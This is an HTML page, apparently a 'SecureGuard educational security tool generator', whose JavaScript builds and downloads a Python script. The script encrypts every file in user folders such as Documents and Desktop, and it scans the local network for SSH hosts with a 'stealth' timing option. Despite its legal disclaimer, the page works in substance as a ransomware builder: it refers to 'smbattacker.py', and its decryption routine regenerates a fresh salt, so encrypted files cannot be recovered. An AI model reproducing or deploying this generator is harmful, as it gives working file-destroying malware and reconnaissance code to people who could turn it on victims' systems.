<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SecureGuard - Educational Security Tool Generator</title>
    <meta name="description" content="Generate customizable Python security tools for educational purposes with configurable encryption, decryption, and network scanning capabilities.">
    <script src="https://cdn.tailwindcss.com"></script>
    <script>
        tailwind.config = {
            darkMode: 'class',
            theme: {
                extend: {
                    colors: {
                        background: 'hsl(20, 14.3%, 4.1%)',
                        foreground: 'hsl(60, 9.1%, 97.8%)',
                        primary: 'hsl(20.5, 90.2%, 48.2%)',
                        'primary-foreground': 'hsl(60, 9.1%, 97.8%)',
                        secondary: 'hsl(12, 6.5%, 15.1%)',
                        'secondary-foreground': 'hsl(60, 9.1%, 97.8%)',
                        muted: 'hsl(12, 6.5%, 15.1%)',
                        'muted-foreground': 'hsl(24, 5.4%, 63.9%)',
                        accent: 'hsl(12, 6.5%, 15.1%)',
                        'accent-foreground': 'hsl(60, 9.1%, 97.8%)',
                        destructive: 'hsl(0, 62.8%, 30.6%)',
                        'destructive-foreground': 'hsl(60, 9.1%, 97.8%)',
                        border: 'hsl(12, 6.5%, 15.1%)',
                        input: 'hsl(12, 6.5%, 15.1%)',
                        ring: 'hsl(20.5, 90.2%, 48.2%)',
                    }
                }
            }
        }
    </script>
    <style>
        .custom-select {
            background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3e%3c/svg%3e");
            background-position: right 0.5rem center;
            background-repeat: no-repeat;
            background-size: 1.5em 1.5em;
            padding-right: 2.5rem;
        }
    </style>
</head>
<body class="dark bg-background text-foreground min-h-screen">
    <div class="container mx-auto px-4 py-8 max-w-4xl">
        <!-- Header -->
        <div class="text-center mb-8">
            <h1 class="text-4xl font-bold mb-4 text-primary">SecureGuard</h1>
            <p class="text-xl text-muted-foreground mb-6">Educational Security Tool Generator</p>
            <div class="bg-destructive/10 border border-destructive/20 rounded-lg p-4 mb-6">
                <h2 class="text-lg font-semibold text-destructive mb-2">‚ö†Ô∏è Legal Notice</h2>
                <p class="text-sm text-muted-foreground">
                    This tool is for <strong>educational and defensive security purposes only</strong>. 
                    Use only on systems you own or have explicit permission to test. 
                    You are fully responsible for compliance with all applicable laws.
                </p>
            </div>
        </div>

        <!-- Configuration Form -->
        <div class="bg-secondary rounded-lg p-6 mb-8">
            <h2 class="text-2xl font-semibold mb-6">Configuration</h2>
            <form id="configForm" class="space-y-6">
                <!-- Target Operating System -->
                <div>
                    <label class="block text-sm font-medium mb-2">Target Operating System</label>
                    <select id="targetOS" class="w-full bg-input border border-border rounded-md px-3 py-2 custom-select">
                        <option value="windows">Windows</option>
                        <option value="linux">Linux</option>
                        <option value="mac">Mac</option>
                    </select>
                </div>

                <!-- Target Directory -->
                <div>
                    <label class="block text-sm font-medium mb-2">Target Directory</label>
                    <select id="targetDirectory" class="w-full bg-input border border-border rounded-md px-3 py-2 custom-select">
                        <!-- Options populated by JavaScript -->
                    </select>
                </div>

                <!-- Backup Location -->
                <div>
                    <label class="block text-sm font-medium mb-2">Backup Location</label>
                    <select id="backupLocation" class="w-full bg-input border border-border rounded-md px-3 py-2 custom-select">
                        <option value="none">None (No backup)</option>
                        <!-- Options populated by JavaScript -->
                    </select>
                </div>

                <!-- Scan Profile -->
                <div>
                    <label class="block text-sm font-medium mb-2">Network Scan Profile</label>
                    <select id="scanProfile" class="w-full bg-input border border-border rounded-md px-3 py-2 custom-select">
                        <option value="stealth">Stealth (Very slow, hard to detect)</option>
                        <option value="normal">Normal (Balanced speed and stealth)</option>
                        <option value="aggressive">Aggressive (Fast but easily detected)</option>
                    </select>
                </div>

                <!-- File Exclusions -->
                <div>
                    <label class="block text-sm font-medium mb-2">File Exclusions</label>
                    <select id="fileExclusions" class="w-full bg-input border border-border rounded-md px-3 py-2 custom-select">
                        <option value="none">None (No exclusions)</option>
                        <option value="system">System files only</option>
                        <option value="media">Media files (.mp3, .mp4, .jpg, etc.)</option>
                        <option value="documents">Document files (.pdf, .doc, .txt, etc.)</option>
                        <option value="all">All common file types</option>
                    </select>
                </div>

                <!-- Password -->
                <div>
                    <label class="block text-sm font-medium mb-2">Encryption Password</label>
                    <input type="password" id="password" class="w-full bg-input border border-border rounded-md px-3 py-2" 
                           placeholder="Enter strong password" required>
                </div>

                <!-- Confirm Password -->
                <div>
                    <label class="block text-sm font-medium mb-2">Confirm Password</label>
                    <input type="password" id="confirmPassword" class="w-full bg-input border border-border rounded-md px-3 py-2" 
                           placeholder="Confirm password" required>
                </div>

                <!-- Generate Button -->
                <button type="submit" class="w-full bg-primary text-primary-foreground font-semibold py-3 px-6 rounded-md hover:bg-primary/90 transition-colors">
                    Generate Security Tool
                </button>
            </form>
        </div>

        <!-- Features -->
        <div class="grid md:grid-cols-2 gap-6 mb-8">
            <div class="bg-secondary rounded-lg p-6">
                <h3 class="text-xl font-semibold mb-3">üîí Encryption Features</h3>
                <ul class="text-muted-foreground space-y-2">
                    <li>‚Ä¢ Password-based file encryption</li>
                    <li>‚Ä¢ Fernet symmetric encryption</li>
                    <li>‚Ä¢ Configurable target directories</li>
                    <li>‚Ä¢ Optional file backup system</li>
                </ul>
            </div>
            <div class="bg-secondary rounded-lg p-6">
                <h3 class="text-xl font-semibold mb-3">üåê Network Features</h3>
                <ul class="text-muted-foreground space-y-2">
                    <li>‚Ä¢ Stealth network scanning</li>
                    <li>‚Ä¢ Configurable scan profiles</li>
                    <li>‚Ä¢ Port discovery capabilities</li>
                    <li>‚Ä¢ Educational reconnaissance</li>
                </ul>
            </div>
        </div>

        <!-- Footer -->
        <div class="text-center text-muted-foreground">
            <p>&copy; 2025 SecureGuard - Educational Security Tool Generator</p>
        </div>
    </div>

    <script>
        // Configuration data
        const directories = {
            windows: [
                'C:\\\\Users\\\\%USERNAME%\\\\Documents',
                'C:\\\\Users\\\\%USERNAME%\\\\Desktop',
                'C:\\\\Users\\\\%USERNAME%\\\\Downloads',
                'C:\\\\Users\\\\%USERNAME%\\\\Pictures',
                'C:\\\\Users\\\\%USERNAME%\\\\Videos',
                'C:\\\\Users\\\\%USERNAME%\\\\Music',
                'C:\\\\Temp',
                'C:\\\\Users\\\\Public'
            ],
            linux: [
                '/home/$USER/Documents',
                '/home/$USER/Desktop',
                '/home/$USER/Downloads',
                '/home/$USER/Pictures',
                '/home/$USER/Videos',
                '/home/$USER/Music',
                '/tmp',
                '/var/tmp',
                '/home/$USER'
            ],
            mac: [
                '/Users/$USER/Documents',
                '/Users/$USER/Desktop',
                '/Users/$USER/Downloads',
                '/Users/$USER/Pictures',
                '/Users/$USER/Movies',
                '/Users/$USER/Music',
                '/tmp',
                '/Users/$USER'
            ]
        };

        const backupLocations = {
            windows: [
                'C:\\\\Backup',
                'C:\\\\Users\\\\%USERNAME%\\\\AppData\\\\Local\\\\Temp\\\\backup',
                'C:\\\\Windows\\\\Temp\\\\backup'
            ],
            linux: [
                '/tmp/backup',
                '/var/tmp/backup',
                '/home/$USER/.backup'
            ],
            mac: [
                '/tmp/backup',
                '/Users/$USER/.backup',
                '/private/tmp/backup'
            ]
        };

        // Update directory options based on OS selection
        function updateDirectories() {
            const os = document.getElementById('targetOS').value;
            const targetDir = document.getElementById('targetDirectory');
            const backupDir = document.getElementById('backupLocation');
            
            // Clear existing options
            targetDir.innerHTML = '';
            backupDir.innerHTML = '<option value="none">None (No backup)</option>';
            
            // Add target directory options
            directories[os].forEach(dir => {
                const option = document.createElement('option');
                option.value = dir;
                option.textContent = dir;
                targetDir.appendChild(option);
            });
            
            // Add backup location options
            backupLocations[os].forEach(dir => {
                const option = document.createElement('option');
                option.value = dir;
                option.textContent = dir;
                backupDir.appendChild(option);
            });
        }

        // Generate the security tool
        function generateTool(config) {
            const template = `#!/usr/bin/env python3
"""
SecureGuard Educational Security Tool
Generated on: ${new Date().toISOString()}
Configuration: ${config.targetOS.toUpperCase()}

WARNING: This tool is for educational and defensive security purposes only.
Use only on systems you own or have explicit permission to test.
"""

import os
import sys
import socket
import time
import threading
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import base64
import shutil

class SecurityTool:
    def __init__(self):
        self.target_directory = "${config.targetDirectory}"
        self.backup_location = "${config.backupLocation}" if "${config.backupLocation}" != "none" else None
        self.scan_profile = "${config.scanProfile}"
        self.file_exclusions = "${config.fileExclusions}"
        self.password = input("Enter password: ").encode()
        
        # Generate encryption key from password
        salt = os.urandom(16)
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(self.password))
        self.cipher_suite = Fernet(key)
        
        # Save salt for decryption
        with open('thekey.key', 'wb') as key_file:
            key_file.write(salt)
    
    def should_exclude_file(self, filepath):
        """Check if file should be excluded based on configuration"""
        filename = os.path.basename(filepath).lower()
        
        # Always exclude essential script files
        essential_files = ['encrypt.py', 'decrypt.py', 'thekey.key', 'smbattacker.py']
        if filename in essential_files:
            return True
            
        if self.file_exclusions == "none":
            return False
        elif self.file_exclusions == "system":
            system_files = ['.sys', '.dll', '.exe', '.msi']
            return any(filename.endswith(ext) for ext in system_files)
        elif self.file_exclusions == "media":
            media_files = ['.mp3', '.mp4', '.avi', '.jpg', '.jpeg', '.png', '.gif']
            return any(filename.endswith(ext) for ext in media_files)
        elif self.file_exclusions == "documents":
            doc_files = ['.pdf', '.doc', '.docx', '.txt', '.rtf']
            return any(filename.endswith(ext) for ext in doc_files)
        elif self.file_exclusions == "all":
            excluded_exts = ['.mp3', '.mp4', '.avi', '.jpg', '.jpeg', '.png', '.gif', 
                           '.pdf', '.doc', '.docx', '.txt', '.rtf', '.sys', '.dll', '.exe']
            return any(filename.endswith(ext) for ext in excluded_exts)
        
        return False
    
    def backup_file(self, filepath):
        """Backup file before encryption"""
        if not self.backup_location:
            return
            
        try:
            os.makedirs(self.backup_location, exist_ok=True)
            backup_path = os.path.join(self.backup_location, os.path.basename(filepath))
            shutil.copy2(filepath, backup_path)
            print(f"Backed up: {filepath}")
        except Exception as e:
            print(f"Backup failed for {filepath}: {e}")
    
    def encrypt_file(self, filepath):
        """Encrypt a single file"""
        if self.should_exclude_file(filepath):
            return
            
        try:
            # Backup if configured
            self.backup_file(filepath)
            
            # Read and encrypt file
            with open(filepath, 'rb') as file:
                file_data = file.read()
            
            encrypted_data = self.cipher_suite.encrypt(file_data)
            
            # Write encrypted data
            with open(filepath, 'wb') as file:
                file.write(encrypted_data)
                
            print(f"Encrypted: {filepath}")
            
        except Exception as e:
            print(f"Encryption failed for {filepath}: {e}")
    
    def decrypt_file(self, filepath):
        """Decrypt a single file"""
        if self.should_exclude_file(filepath):
            return
            
        try:
            with open(filepath, 'rb') as file:
                encrypted_data = file.read()
            
            decrypted_data = self.cipher_suite.decrypt(encrypted_data)
            
            with open(filepath, 'wb') as file:
                file.write(decrypted_data)
                
            print(f"Decrypted: {filepath}")
            
        except Exception as e:
            print(f"Decryption failed for {filepath}: {e}")
    
    def scan_network(self):
        """Network scanning functionality"""
        print(f"Starting {self.scan_profile} network scan...")
        
        # Scan timing based on profile
        timing_configs = {
            'stealth': {'delay': 2.0, 'timeout': 10},
            'normal': {'delay': 0.5, 'timeout': 5},
            'aggressive': {'delay': 0.1, 'timeout': 1}
        }
        
        config = timing_configs[self.scan_profile]
        
        # Get local network range
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        network_base = '.'.join(local_ip.split('.')[:-1]) + '.'
        
        print(f"Scanning network: {network_base}0/24")
        
        def scan_host(ip):
            try:
                socket.setdefaulttimeout(config['timeout'])
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                result = sock.connect_ex((ip, 22))  # SSH port
                if result == 0:
                    print(f"Host found: {ip}:22 (SSH)")
                sock.close()
            except:
                pass
            
            time.sleep(config['delay'])
        
        # Scan network range
        threads = []
        for i in range(1, 255):
            ip = network_base + str(i)
            thread = threading.Thread(target=scan_host, args=(ip,))
            threads.append(thread)
            thread.start()
            
            # Limit concurrent threads
            if len(threads) >= 50:
                for t in threads:
                    t.join()
                threads = []
        
        # Wait for remaining threads
        for t in threads:
            t.join()
    
    def run_encryption(self):
        """Run file encryption on target directory"""
        print(f"Starting encryption on: {self.target_directory}")
        
        if not os.path.exists(self.target_directory):
            print(f"Target directory does not exist: {self.target_directory}")
            return
        
        for root, dirs, files in os.walk(self.target_directory):
            for file in files:
                filepath = os.path.join(root, file)
                self.encrypt_file(filepath)
    
    def run_decryption(self):
        """Run file decryption on target directory"""
        print(f"Starting decryption on: {self.target_directory}")
        
        if not os.path.exists(self.target_directory):
            print(f"Target directory does not exist: {self.target_directory}")
            return
        
        for root, dirs, files in os.walk(self.target_directory):
            for file in files:
                filepath = os.path.join(root, file)
                self.decrypt_file(filepath)

def main():
    print("SecureGuard Educational Security Tool")
    print("===================================")
    print("1. Network Scan")
    print("2. Encrypt Files")
    print("3. Decrypt Files")
    
    choice = input("Select operation (1-3): ").strip()
    
    tool = SecurityTool()
    
    if choice == "1":
        tool.scan_network()
    elif choice == "2":
        tool.run_encryption()
    elif choice == "3":
        tool.run_decryption()
    else:
        print("Invalid choice")

if __name__ == "__main__":
    main()
`;

            return template;
        }

        // Form submission
        document.getElementById('configForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const password = document.getElementById('password').value;
            const confirmPassword = document.getElementById('confirmPassword').value;
            
            if (password !== confirmPassword) {
                alert('Passwords do not match!');
                return;
            }
            
            if (password.length < 8) {
                alert('Password must be at least 8 characters long!');
                return;
            }
            
            const config = {
                targetOS: document.getElementById('targetOS').value,
                targetDirectory: document.getElementById('targetDirectory').value,
                backupLocation: document.getElementById('backupLocation').value,
                scanProfile: document.getElementById('scanProfile').value,
                fileExclusions: document.getElementById('fileExclusions').value,
                password: password
            };
            
            const toolCode = generateTool(config);
            
            // Create and download file
            const blob = new Blob([toolCode], { type: 'text/plain' });
            const url = window.URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `secureguard_${config.targetOS}_tool.py`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            window.URL.revokeObjectURL(url);
            
            alert('Security tool generated and downloaded successfully!');
        });

        // Initialize
        document.getElementById('targetOS').addEventListener('change', updateDirectories);
        updateDirectories(); // Initial load
    </script>
</body>
</html>